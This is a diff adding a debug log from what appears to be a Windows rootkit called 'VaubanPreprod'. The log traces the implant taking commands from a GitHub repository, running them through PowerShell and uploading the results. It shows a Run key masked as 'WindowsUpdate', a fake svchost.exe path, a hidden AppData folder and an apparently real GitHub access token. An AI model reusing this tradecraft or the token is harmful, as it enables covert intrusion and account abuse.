@@ -1,0 +1,26 @@
+Tue Jul 27 00:53:03 2021. Initialisation of the log file.
+
+DEBUG: Tue Jul 27 00:53:03 2021: GithubLogin: hidemepls785
+DEBUG: Tue Jul 27 00:53:03 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Tue Jul 27 00:53:03 2021: GihubAccessToken: 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
+DEBUG: Tue Jul 27 00:53:04 2021: Rootkit Name: VaubanPreprod
+DEBUG: Tue Jul 27 00:53:04 2021: Rootkit Registry Key: Sensors
+DEBUG: Tue Jul 27 00:53:04 2021: Run Registry Key Name: WindowsUpdate
+DEBUG: Tue Jul 27 00:53:04 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Tue Jul 27 00:53:04 2021: The folder list for random folder is not empty. Its size is: 2483
+DEBUG: Tue Jul 27 00:53:04 2021: The random path choosed for this execution is: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\88000163
+DEBUG: Tue Jul 27 00:53:04 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Tue Jul 27 00:53:05 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Tue Jul 27 00:53:05 2021: Success to check the commands with rootkit_path1
+DEBUG: Tue Jul 27 00:53:05 2021: Getting this command from the github repo: execute_cmd dir C:\Users\Client
+DEBUG: Tue Jul 27 00:53:06 2021: Start to treat the commands sent by the github repo.
+DEBUG: Tue Jul 27 00:53:06 2021: Command received: execute_cmd
+DEBUG: Tue Jul 27 00:53:06 2021: The following command will be executed by powershell: dir C:\Users\Client > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\88000163\target_command.log1
+DEBUG: Tue Jul 27 00:53:08 2021: Unable to find the file target_command.log. Check your command..
+DEBUG: Tue Jul 27 00:53:08 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Tue Jul 27 00:53:09 2021: #####################################################
+
+DEBUG: Tue Jul 27 00:53:10 2021: Start of GithubCommunication::sendResults
+DEBUG: Tue Jul 27 00:53:11 2021: The results was uploaded on the github repo
+DEBUG: Tue Jul 27 00:53:11 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Tue Jul 27 00:53:11 2021: Start of GithubCommunication::sendLogs
